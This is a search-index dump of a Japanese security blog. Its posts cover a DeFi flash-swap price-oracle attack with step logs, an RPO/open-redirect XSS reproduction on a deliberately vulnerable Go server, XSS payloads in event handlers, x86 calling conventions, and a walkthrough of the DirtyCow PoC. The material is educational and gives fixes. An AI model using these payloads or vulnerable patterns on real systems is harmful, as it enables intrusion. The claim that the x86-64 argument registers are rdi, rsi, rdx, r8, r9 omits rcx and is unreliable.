7 ) USDCをDEIへスワップ  フラッシュローンの返却のため、USDCをDEIへスワップします。\nログにより、my USDC balanceが0に、my DEI balanceが増えていることが確認できます。\n [+] (7) swap USDC to DEI from sAMM pool [+] my USDC balance: 0 [+] my DEI balance: 12787419360961504871925327    8 ) ステップ1でフラッシュスワップしたものを返却  これで、借りたDEI以上の資金を用意できたため、フラッシュスワップが正常に終了します。\n [+] (8) exit the flash swap from spirit pool [+] my USDC balance: 0 [+] my DEI balance: 3018770729245407709894965    9 ) DEIをUSDCへスワップ  最終的に、3064570164495ドルが得られます。\n [+] (9) swap DEI to USDC from sAMM pool [+] my USDC balance: 3064570164495 [+] my DEI balance: 0    修正  今回の問題は、DEIの現在価格が、USDC / DEIのプールの現在の残高から導き出されてしまうことに問題がありました。\nそのような実装になっていたため、フラッシュスワップでの大規模な借り入れが発生すると、DEIの現在価格が低く計算されてしまっていました。\nそのためDeus Financeでは、Time-Weighted Average Price (TWAP)という時間加重平均を用いた価格算出ロジックに変更することで修正されました。\nOracle.sol#L85-L91\nOracles | Uniswap\n","date":"Apr 20","permalink":"https://mute1997.github.io/post/2022-04-20-semgrep-smart-contracts-1/","tags":["security"],"title":"semgrep-smart-contractsをすべて読む #01 (basic-oracle-manipulation)"},{"categories":null,"contents":"RPOとは、Gareth Heyesが提唱した脆弱性です。(http://www.thespanner.co.uk/2014/03/21/rpo/)\nこの脆弱性の理解のため、今回はintigritiのXSS Challengeで出題された問題の再現を行います。 この問題の詳細は以下の動画で確認できます。\n 上記の動画では、http://vulnerable-server//example.com/..にアクセスを行い、相対パスで読み込んでいるリソースの起点をhttp://vulnerable-server//example.comとすることで、任意のスクリプトの実行を行なっています。\nhttp://vulnerable-server//example.com/..へのアクセスは、サーバーの仕様によりhttp://vulnerable-server/にアクセスした時と同じコンテンツが返却されます。\nhttp://vulnerable-server/では、以下の様に相対パスでのスクリプトの読み込みを行なっているため、http://vulnerable-server//example.com/script.jsからスクリプトが読み込まれます。\n1  \u0026lt;script src=script.js\u0026gt; \u0026lt;/script\u0026gt; \u0026lt;!-- http://vulnerable-server//example.com/script.js--\u0026gt;   http://vulnerable-server//example.com/script.jsへのアクセスは、リダイレクトの機能が動作するため、実際にはhttp://example.com/script.jsから読み込まれます。\n攻撃者はexample.comの部分を好きなドメインに書き換えてアクセスすることで、好きなドメインからスクリプトを読み込むことが可能になります。\n   実装してみる  今回実装する脆弱なWebサーバーは、以下の機能を有しています。\n //\u0026lt;ホスト名\u0026gt;というようなアクセスでリダイレクトが可能  ex. http://vulnerable-server//example.com   正規化されたパスのコンテンツが返却される  ex. http://example.com/first/.. =\u0026gt; http://example.com/   相対パスでスクリプトの読み込みが行われている  ex. \u0026lt;script src=script.js\u0026gt;\u0026lt;/script\u0026gt;    Webサーバーの実装は以下の通りです。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  package main import ( \u0026#34;net/http\u0026#34; \u0026#34;log\u0026#34; \u0026#34;path\u0026#34; \u0026#34;fmt\u0026#34; ) type VulnerableHandler map[string]http.Handler func (v VulnerableHandler) ServeHTTP(w http.ResponseWriter,r *http.Request){ // Serve HTTP \tp := path.Clean(r.URL.Path) if h, ok := v[p]; ok { log.Printf(\u0026#34;serve: %s\\n\u0026#34;, p) h.ServeHTTP(w, r) return } // OpenRedirect \tif len(r.URL.Path) \u0026gt; 1 \u0026amp;\u0026amp; r.URL.Path[0] == \u0026#39;/\u0026#39; \u0026amp;\u0026amp; r.URL.Path[1] == \u0026#39;/\u0026#39; { redirectTo := fmt.Sprintf(\u0026#34;https://%s\u0026#34;, r.URL.Path[2:]) w.Header().Set(\u0026#34;Location\u0026#34;, redirectTo) w.WriteHeader(302) log.Printf(\u0026#34;redirect: %s\\n\u0026#34;, redirectTo) return } // return 404 \thttp.Error(w, \u0026#34;404\u0026#34;, http.StatusNotFound) } func index(w http.ResponseWriter, r *http.Request) { w.Write([]byte(` \u0026lt;p\u0026gt;index page\u0026lt;/p\u0026gt; \u0026lt;script src=\u0026#34;script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; `)) } func main() { mux := http.NewServeMux() mux.Handle(\u0026#34;/\u0026#34;, VulnerableHandler{ \u0026#34;/\u0026#34;: http.HandlerFunc(index), }) handler := VulnerableHandler{ \u0026#34;/\u0026#34;: http.HandlerFunc(index), } http.ListenAndServe(\u0026#34;:8000\u0026#34;, handler) }   GitHubのリンクはこちらです。(https://github.com/mute1997/relative-path-overwrite)\n   再現  実装したサーバーを用いて、XSSを再現させます。\nまずChromeでhttp://localhost:8000//example.com/..にアクセスしますが、ここで問題があります。\n以下のスクリーンショットの様に、Chromeではhttp://localhost:8000//example.com/..にアクセスした場合、ブラウザによってhttp://localhost:8000へのアクセスへ勝手に変更されてしまいます。\nこの挙動は、FireFoxはSafariでも同様です。 これでは、相対パスの起点をhttp://localhost:8000//example.comにすることが出来ません。\nしかし、FireFoxではhttp://localhost:8000//example.com/%2e%2eと言う様なアクセスを行うことで、ブラウザの正規化を回避してアクセスが可能になります。\nFireFoxでhttp://localhost:8000//example.com/%2e%2eにアクセスすることで、以下の様にhttp://example.com/script.jsからファイルを読み込んでおり、攻撃が成功したことがわかります。\n   まとめ  今回の例では、非常に限定的ではありますが、RPOとOpenRedirectを用いてXSSが可能であることを確認できました。 相対パスの読み込みを絶対パスに修正するだけで回避可能な脆弱性なため、リソースの読み込みは必要が無ければ絶対URLで行うのが良さそうです。\n","date":"Jul 20","permalink":"https://mute1997.github.io/post/2021-07-21-rpo/","tags":["security"],"title":"RPOとOpenRedirectを用いたXSS"},{"categories":null,"contents":"","date":"Nov 26","permalink":"https://mute1997.github.io/articles/","tags":null,"title":"Articles"},{"categories":null,"contents":"以下の記事を読んでいて気になったことがあるので調べてみた。\nhttps://portswigger.net/web-security/cross-site-scripting/preventing#encode-data-on-output\n気になったのは以下の部分。\n1 2 3  Sometimes you\u0026#39;ll need to apply multiple layers of encoding, in the correct order. For example, to safely embed user input inside an event handler, you need to deal with both the JavaScript context and the HTML context. So you need to first Unicode-escape the input, and then HTML-encode it: \u0026lt;a href=\u0026#34;#\u0026#34; onclick=\u0026#34;x=\u0026#39;This string needs two layers of escaping\u0026#39;\u0026#34;\u0026gt;test\u0026lt;/a\u0026gt;   イベントハンドラにJavaScriptを書いている所にユーザーの入力を埋め込む場合は、unicodeエスケープをしてからHTMLエンコードする必要があると書いてある。\n個人的にはunicodeエスケープだけではダメなのか気になったので実験してみた。\nアラートを実行するために';alert(1);'を入力したことを考える。\n以下がunicodeエスケープのみを行って埋め込んだ場合。\n1  \u0026lt;a href=\u0026#34;#\u0026#34; onclick=\u0026#34;x=\u0026#39;\u0026amp;#x0027;\u0026amp;#x003b;alert\u0026amp;#x0028;1\u0026amp;#x0029;\u0026amp;#x003b;\u0026amp;#x0027;\u0026#39;;\u0026#34;\u0026gt;link\u0026lt;/a\u0026gt;   以下はunicodeエスケープした後にHTMLエンコードを行ったもの。\n1  \u0026lt;a href=\u0026#34;#\u0026#34; onclick=\u0026#34;x=\u0026#39;\u0026amp;#38;\u0026amp;#35;x0027\u0026amp;#59;\u0026amp;#38;\u0026amp;#35;x003b\u0026amp;#59;alert\u0026amp;#38;\u0026amp;#35;x0028\u0026amp;#59;1\u0026amp;#38;\u0026amp;#35;x0029\u0026amp;#59;\u0026amp;#38;\u0026amp;#35;x003b\u0026amp;#59;\u0026amp;#38;\u0026amp;#35;x0027\u0026amp;#59;\u0026#39;;\u0026#34;\u0026gt;link\u0026lt;/a\u0026gt;   unicodeエスケープとHTMLエンコードには以下の関数を用いた。\n1 2 3 4 5  function htmlEncode(str){ return String(str).replace(/[^\\w. ]/gi, function(c){ return \u0026#39;\u0026amp;#\u0026#39;+c.charCodeAt(0)+\u0026#39;;\u0026#39;; }); }   1 2 3 4 5  function jsEscape(str){ return String(str).replace(/[^\\w. ]/gi, function(c){ return \u0026#39;\u0026amp;#x\u0026#39;+(\u0026#39;0000\u0026#39;+c.charCodeAt(0).toString(16)).slice(-4)+\u0026#39;;\u0026#39;; }); }   これらをブラウザで開いてからクリックすると、前者はアラートが実行され、後者は何も起こらない。\nこれはイベントハンドラでのみ起こるのか調べるために、unicodeエスケープのみを行った\u0026lt;img src=x onerror=alert(1)\u0026gt;をページに書き込んで開いてみる。\n1  \u0026amp;#x003c;img src\u0026amp;#x003d;x onerror\u0026amp;#x003d;alert\u0026amp;#x0028;1\u0026amp;#x0029;\u0026amp;#x003e;   \u0026lt;img src=x onerror=alert(1)\u0026gt;と表示され、アラートは発火しない。\nイベントハンドラと同じJavaScriptコードがscriptタグに埋め込まれている場合を考える。\n以下のようなHTMLがサーバーによって生成される。\n1 2 3  \u0026lt;script\u0026gt; x=\u0026#39;\u0026amp;#x0027;\u0026amp;#x003b;alert\u0026amp;#x0028;1\u0026amp;#x0029;\u0026amp;#x003b;\u0026amp;#x0027;\u0026#39;; \u0026lt;/script\u0026gt;   これを開いてもアラートは実行されない。\nこれらからイベントハンドラでのみ実体参照が評価された状態でJavaScriptが実行されることがわかる。\n","date":"Nov 07","permalink":"https://mute1997.github.io/post/2020-11-07-entity-reference-in-event-handler/","tags":["security"],"title":"イベントハンドラでの実体参照の扱い"},{"categories":null,"contents":"以下の文書はx86についての説明です。\n   メモリ配置  メモリ配置は以下の図のようになっています。\nテキストセグメントには実行されるコード、データセグメントは初期化済みのグローバル変数、bssセグメントには初期化されていないグローバル変数、ヒープセグメントは、mallocなどで動的に確保される変数が配置されます。\n今回はスタックに焦点をあてて説明していきます。\n   スタック  スタックとはメモリ上の領域の1つで、\n 引数の保存 ローカル変数の保存 関数呼び出し  に利用されます。\nスタックのアドレスは高値から低位に伸びていき、ebp, espレジスタにスタックのアドレスが保存されます。 以下の画像の様に、ebpは現在の関数のスタックの底を、espはスタックのトップを表しています。\nこれらのレジスタの値はpush, pop, call, retによって操作されます。\npushすると値がスタックに追加されたあとにespが4(x86_64の場合は8)だけデクリメントされ、popすると値がレジスタに読み込まれてespがインクリメントされます。\ncallの場合には、eipをリターンアドレスとしてpush, eipを呼び出し関数の先頭にセットします。 retすると、スタックからアドレスを取得してeipにセットします。\n   スタックフレーム  スタックフレームは以下の様になってます。\nリターンアドレスはcall命令によるもので、ebpのアドレスがあるのは、Function prologueによるものです。\n   Function prologue  Function prologueは関数の先頭で行われる処理のことです。 実際には以下のような処理を行います。 push ebpでは、関数の終了時にebpを復元するために一旦スタックに退避しています。 mov ebp,espでは、現在のebpをespに代入することで、現在のスタックトップをベースにしています。\n1 2  push ebp mov ebp,esp      Function epilogue  Function epilogueは関数の最後に行われる処理のことです。 実際には以下のような処理が行われています。\n1 2  leave ret   このleaveという命令は、\n1 2  mov esp ebp pop ebp   と同等の処理を行うものです。\nこれらは、espをebpに戻して、スタックからebpの値を復元します。 retでは、前のeipの値をスタックからポップして元のコードに戻ります。\n   calling convention  スタックに引数を積む場合には、呼び出し規則(calling convention)と呼ばれる方法があります。 32bitバイナリでは、関数の引数は逆順にスタックに渡されます。 64bitバイナリでは、関数の引数を渡すのにスタックは使わず、レジスタを利用します。 渡される順番は以下の通りです。\n rdi rsi rdx r8 r9  5個を超えるような場合には32bitバイナリと同様にスタックにプッシュされます。\n","date":"Aug 22","permalink":"https://mute1997.github.io/post/2020-08-22-stack-and-calling-conventions/","tags":["linux"],"title":"スタックと呼び出し規約"},{"categories":null,"contents":"DirtyCowについて調べたので理解するのに必要となる前提知識と一緒にPoCについての説明をまとめておきます。\nrootを取ったり、REHLで動くものがありますが今回は一番基本的な、権限のないファイルに書き込むPoC(https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c)についてまとめます。\n   DirtyCowについて  DirtyCowはCopy on Writeの取り扱いにおいて競合状態が発生し、プライベートなメモリマッピングが破壊されるというものです。 CVEではCVE-2016-5195として管理されています。\nhttps://jvndb.jvn.jp/ja/contents/2016/JVNDB-2016-005596.html\n   前提知識など     mmap  mmapはファイルやデバイスをメモリにマッピングするためのものです。\nreadやwriteを使うとカーネル空間からユーザープロセスへのコピーが発生しますが、mmapはマッピングしたアドレスを返すだけでユーザー空間へのコピーが発生しません。\nそのためreadやwriteを使うよりも効率期にファイルの読み書きが可能になるようです。\n\u0026ldquo;なるようです\u0026quot;と書いたのはどの場合においてもmmapのほうが早いわけではないからです。\n日本語で詳しく解説されている記事があったのでどうぞ。\nman mmapしてでてくる情報を簡単にまとめます。 プロトタイプ宣言は次のようになっています。\n1  void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off);   addrにはマッピングするアドレスを指定します。NULLを指定するとマッピングするアドレスをカーネルが決定してくれます。\nlenにはマッピングするサイズを指定します。\nprotにはPROT_EXEC, PROT_READ, PROT_WRITE, PROT_NONEを指定します。それぞれ、実行可能、読み書き可能、書き込み可能、アクセス不可能を表します。\nflagsには、MAP_SHARED, MAP_PRIVATE, MAP_FIXEDが指定できます。MAP_PRIVATEが指定されるとCopy on Writeでファイルがマッピングされます。\nfildesにはファイルディスクリプタを指定します。\noffにはファイルのオフセットを指定します。\nmmapを利用した簡単なファイルを読み込むをするサンプルを書いてみました。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;sys/mman.h\u0026gt;#include \u0026lt;sys/types.h\u0026gt;#include \u0026lt;sys/stat.h\u0026gt;#include \u0026lt;fcntl.h\u0026gt; int main(int argc, char *argv[]){ if (argc \u0026lt;= 1) { printf(\u0026#34;please specify filename\\n\u0026#34;); return 1; } int fd = open(argv[1],O_RDONLY); if (fd \u0026lt; 0) { printf(\u0026#34;file not found\\n\u0026#34;); return 1; } printf(\u0026#34;file discriptor: %d\\n\u0026#34;, fd); struct stat st; fstat(fd, \u0026amp;st); printf(\u0026#34;file size: %ld\\n\u0026#34;, st.st_size); char* map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,fd,0); printf(\u0026#34;%s\\n\u0026#34;, map); return 0; }   更に詳しい情報はman mmapで得られます。\n   Copy on Write  Copy on Writeとは書き込みが行われるまでは元から存在するマッピングを利用し、書き込みが起こったと同時にメモリ上に新たに複製が作られるという動作のことをいいます。\nこれによってforkするたびに、メモリ上に複製を作るより効率よくメモリを利用することができます。\n書き込みによって作られた新たな複製は、他のプロセスからは見ることができません。\nここで実験のために少しコードを書いてみようと思います。\n先ほど説明したように、書き込みが行われるまでは同じマッピングを利用し、書き込みが行われるときに新たな領域が確保され、複製されます。\nプロセスのファイルマッピングは/proc/{pid}/smapsで確認することができます。\n出力はだいたいこんなのが得られます。\nSize: 4 kB KernelPageSize: 4 kB MMUPageSize: 4 kB Rss: 0 kB Pss: 0 kB Shared_Clean: 0 kB Shared_Dirty: 0 kB Private_Clean: 0 kB Private_Dirty: 0 kB Referenced: 0 kB Anonymous: 0 kB LazyFree: 0 kB AnonHugePages: 0 kB ShmemPmdMapped: 0 kB Shared_Hugetlb: 0 kB Private_Hugetlb: 0 kB Swap: 0 kB SwapPss: 0 kB Locked: 0 kB VmFlags: rd mr mw me これを利用してみます。\n先程の説明通りなら、書き込みを行うまでは親プロセスと子プロセスのメモリマッピングは同じ、親プロセスか子プロセスどちらかで書き込むとメモリマッピングが変わるはずです。\n次のようなコード書いて実験してみます。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;stdint.h\u0026gt;#include \u0026lt;fcntl.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;errno.h\u0026gt;#include \u0026lt;sys/mman.h\u0026gt;#include \u0026lt;sys/types.h\u0026gt;#include \u0026lt;sys/stat.h\u0026gt;#include \u0026lt;sys/wait.h\u0026gt; #define IS_WRITE 1  int fd; struct stat st; void *map; int main(int argc, char *argv[]){ if (argc \u0026lt;= 1) { printf(\u0026#34;please specify filename\\n\u0026#34;); return 1; } fd = open(argv[1],O_RDWR); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;%s\\n\u0026#34;, strerror(errno)); return 1; } fstat(fd, \u0026amp;st); // MAP_PRIVATE(copy on write)でマッピング  map = (char *)mmap(NULL,st.st_size,PROT_WRITE,MAP_PRIVATE,fd,0); // 読み込み  FILE *f = fopen(\u0026#34;/dev/null\u0026#34;, \u0026#34;w\u0026#34;); fprintf(f, \u0026#34;%s\\n\u0026#34;, map); if (map == MAP_FAILED) { fprintf(stderr, \u0026#34;%s\\n\u0026#34;, strerror(errno)); return -1; } int pid = getpid(); printf(\u0026#34;(main) pid: %d\\n\u0026#34;, pid); // -------------------  // fork  // -------------------  int status; pid = fork(); if (pid == 0) { pid = getpid(); printf(\u0026#34;(fork) pid: %d\\n\u0026#34;, pid); // 読み込み  FILE *f = fopen(\u0026#34;/dev/null\u0026#34;, \u0026#34;w\u0026#34;); fprintf(f, \u0026#34;%s\\n\u0026#34;, map); if (!IS_WRITE) sleep(100); // 書き込み  strcat(map, \u0026#34;A\u0026#34;); if (IS_WRITE) sleep(100); } wait(\u0026amp;status); // -------------------  if (munmap(map, st.st_size) == -1){ fprintf(stderr, \u0026#34;%s\\n\u0026#34;, strerror(errno)); return -1; } return 0; }   マッピングした領域に書き込む前にsleepを挟んでからコンパイルして実行します。\nsleepに入ったらcat /proc/{pid}/smaps | grep -A 20 filenameして子プロセスのマッピングをみます。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  Size: 4 kB KernelPageSize: 4 kB MMUPageSize: 4 kB Rss: 4 kB Pss: 2 kB Shared_Clean: 4 kB Shared_Dirty: 0 kB Private_Clean: 0 kB Private_Dirty: 0 kB Referenced: 4 kB Anonymous: 0 kB LazyFree: 0 kB AnonHugePages: 0 kB ShmemPmdMapped: 0 kB Shared_Hugetlb: 0 kB Private_Hugetlb: 0 kB Swap: 0 kB SwapPss: 0 kB Locked: 2 kB VmFlags: wr mr mw me ac   Shared_Cleanが4kBになってます。\n親プロセスと子プロセスで同じファイル触っているので共有されていますね。\n書き込みをしてから親プロセスのマッピングを見てみます。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  Size: 4 kB KernelPageSize: 4 kB MMUPageSize: 4 kB Rss: 4 kB Pss: 4 kB Shared_Clean: 0 kB Shared_Dirty: 0 kB Private_Clean: 0 kB Private_Dirty: 4 kB Referenced: 4 kB Anonymous: 4 kB LazyFree: 0 kB AnonHugePages: 0 kB ShmemPmdMapped: 0 kB Shared_Hugetlb: 0 kB Private_Hugetlb: 0 kB Swap: 0 kB SwapPss: 0 kB Locked: 4 kB VmFlags: wr mr mw me ac   Private_Dirtyが4kBになりましたね。\nマッピングしていたファイルが新しいプロセスのためにメモリ上に新たに複製されました。\n   madvise  madviseはカーネルに、メモリのページング処理についてアドバイスを出すために使用します。\n1  int madvise(void *addr, size_t length, int advice);   addrにはアドレスを、lengthにはサイズ、adviceにはカーネルに対するアドバイスを渡します。詳細はman madviseで確認することが出来ます。\nDirtyCowではadviceにMADV_DONTNEEDが渡されています。\nこれは、しばらくは指定されたアドレスへのアクセスはなさそうなのでmmapしたメモリは一旦開放して良いということをカーネルに伝えるものです。\nこれによってmmapしたファイルは開放され、次に読み込むときは再びIOが発生し、メモリに読み込まれます。 元ファイルが削除されていた場合は0fillされます。\n   PoCコードの解説  https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c\nPoCの大まかな動作としては、mainで読み込みたいファイルをmmap, それからmadviseThread, procselfmemThreadを各スレッドで動かしています。\nmadviseThreadではmadviseをループして何度も実行、procselfmemThreadでは自分のプロセスのメモリである/proc/self/memを開き、mmapされた場所に文字列を書き込み続けています。\nこの2つの動作が連続することにより競合状態が発生し、プライベートなメモリマップであるはずのものがディスクに書き込まれてしまいます。\nこれを理解する上で重要なのはページキャッシュの動作です。\nページキャッシュの動作として、読み込みが行われると、読み込んだものはキャッシュに置かれ、書き込みが行われると、即座に書き込みは行われず、キャッシュに書き込んだ上で適当なタイミングで書き込みが行われます。Linuxカーネルではキャッシュに書き込みを行うと書き込んだページにDirty bitが立てられます。\n先ほど説明したmadviseとwriteを繰り返すと、writeを行ってからDirty bitを立てる前にmadviseによってページがディスクに書き込まれることによって、権限の無いファイルに書き込みができてしまうというわけです。\ndraw.ioで2秒くらいで書いた図によるとこんな感じです。\n   最後に  本当はパッチを読んだりしてたんですがこれ以上長くなるとしんどいのでやめました。\nDirtyCowのパッチには不十分で、THPを使用している場合にはCoWを用いることなくdirty bitを立てることができるらしいですね。\n気が向いたらパッチを読みつつ不十分だった部分など解説します。\n","date":"Aug 11","permalink":"https://mute1997.github.io/post/2018-08-11-how-dirtycow-work/","tags":["security"],"title":"DirtycowのPoCを読む"}]